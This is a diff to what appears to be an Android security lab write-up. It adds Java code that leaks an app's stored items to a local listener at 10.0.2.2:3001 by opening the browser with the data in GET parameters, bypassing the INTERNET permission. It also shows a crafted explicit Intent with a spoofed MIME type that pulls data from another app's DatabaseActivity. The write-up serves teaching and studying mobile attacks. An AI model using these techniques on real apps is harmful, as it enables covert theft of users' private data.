@@ -23,10 +23,24 @@ On android and iOS, apps are sandboxed and heavily restricted, as
 opposed to desktop apps. If an app wants to access a private resource
 (camera, location, etc), it needs to be explicitely allowed to do so by
 the OS and the user. The goal is to make these apps as secure and as
-privacy-aware as possible. While on desktop a simple Tetris has read and
-write access to all user files, on android even a vulnerable app is
-limited in its action. it also hints on illegitimate apps; for examle,
-the flashlight app shouldn't require microphone access.
+privacy-aware as possible. While on desktop all applications are
+unrestricted and could access all user files with r/w permissions, on
+android even a vulnerable app is limited in its action. it also hints on
+illegitimate apps; for examle, the flashlight app shouldn't require
+microphone access. The goal of these permissions is to add boundaries to
+apps, which greatly reduce the risks to the user.
+
+Permissions are defined in a special file, the Android manifest of the
+app. This file will describe all meta-informations about the app, like
+which activities are public, what resources the app should use for its
+icon, and more important here what permissions are used. In the
+following example, an app is requiring the internet permission. Some
+permissions aren't necessarily granted though, like the microphone one.
+While it needs to be declared, the user can still decide to disable it.
+
+```xml
+<uses-permission android:name="android.permission.INTERNET" />
+```
 
 However, here our application uses a simple trick to bypass this
 permission system. It will open the web browser on a specific page, and
@@ -35,6 +49,30 @@ the app, it is enough to leak informations using GET parameters. It
 should be noted however that, first, the data accessible is only our own
 data, which limits the damages possible, and that this method isn't very
 discreet, as the user clearly sees its browser opening.
+
+The code used is the following one:
+
+```java
+// This will be our URL like http://10.0.2.2:3001/?secret1=abc&secret2=def
+StringBuilder evilRequest = new StringBuilder("/?");
+for (Item item : mItemsData) {
+	// Add each item to the exfiltration URL
+	evilRequest
+		.append(Uri.encode(item.getTitle()))
+		.append("=")
+		.append(Uri.encode(item.getInfo()))
+		.append("&");
+}
+// Create the intent to open the browser
+Intent intent = new Intent(
+	Intent.ACTION_VIEW,
+	Uri.parse(url + evilRequest)
+);
+if (intent.resolveActivity(getPackageManager()) != null) {
+	// Start the intent if an an app is able to handle it
+	startActivity(intent);
+}
+```
 
 # 2 - Malicious intents
 
@@ -56,8 +94,8 @@ The malicious intent code is the following one:
 Intent i = new Intent(Intent.ACTION_MAIN);
 // Explicitely set the component that will receive the intent
 i.setComponent(new ComponentName(
-    "lbs.lab.maclocation", // Target package
-    "lbs.lab.maclocation.DatabaseActivity" // Target activity
+	"lbs.lab.maclocation", // Target package
+	"lbs.lab.maclocation.DatabaseActivity" // Target activity
 ));
 // MIME data type, equal to `DatabaseActivity.class.getCanonicalName()`
 //  Used to trick the DatabaseActivity condition
@@ -69,7 +107,12 @@ i.putExtra(ITEM_ACTION, GET_ITEMS_ACTION);
 
 Once the data retrieved, we need to deserialize it by creating our own
 implementation of `lbs.lab.maclocation.Item`, and then exfiltrate it
-like we did previously in the first part.
+like we did previously in the first part. To find which class to
+recreate, we need to look at the logs when trying to deserialize the
+object. We get a `ClassNotFoundException` that will then hint us on
+which class isn't found, by logging something like `the class
+lbs.lab.maclocation.Item cannot be found`. We now know which class we
+need to write.
 
 There are currently a few checks in `DatabaseActivity`:
 - The MIME data type should be set to
